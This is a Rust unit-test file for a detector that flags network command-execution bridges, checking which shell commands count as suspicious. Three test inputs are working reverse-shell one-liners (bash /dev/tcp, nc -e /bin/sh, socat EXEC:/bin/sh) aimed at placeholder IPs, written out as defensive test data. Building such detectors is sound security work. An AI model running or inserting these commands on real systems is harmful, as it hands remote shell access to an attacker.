use super::assess_network_execution_command;

#[test]
fn detects_common_network_execution_bridges() {
    assert!(
        assess_network_execution_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").is_suspicious()
    );
    assert!(assess_network_execution_command("nc -e /bin/sh 203.0.113.10 4444").is_suspicious());
    assert!(
        assess_network_execution_command("socat TCP:203.0.113.10:4444 EXEC:/bin/sh,pty")
            .is_suspicious()
    );
}

#[test]
fn ignores_plain_forwarders_and_shell_wrappers() {
    assert!(!assess_network_execution_command(
        "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443"
    )
    .is_suspicious());
    assert!(!assess_network_execution_command(
        "/bin/sh -c '/usr/local/bin/app --listen 0.0.0.0:443'"
    )
    .is_suspicious());
    assert!(
        !assess_network_execution_command("ssh -N -L 127.0.0.1:8080:10.0.0.1:80 bastion")
            .is_suspicious()
    );
}

#[test]
fn ignores_non_shell_exec_bridges() {
    assert!(!assess_network_execution_command(
        "socat TCP-LISTEN:9000,fork EXEC:/usr/local/bin/health-check"
    )
    .is_suspicious());
}

#[test]
fn tty_detection_requires_pty_option_boundary() {
    assert!(
        !assess_network_execution_command("tool TCP:203.0.113.10:4444 /bin/sh empty")
            .is_suspicious()
    );
}
